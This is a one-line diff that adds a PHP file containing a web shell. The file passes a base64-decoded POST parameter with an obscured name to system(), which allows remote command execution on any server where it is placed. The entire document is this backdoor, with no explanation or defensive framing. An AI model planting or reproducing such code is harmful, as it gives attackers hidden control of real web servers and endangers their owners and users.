@@ -1,0 +1,1 @@
+<?php system(base64_decode($_POST['e6fb72f5']));?>
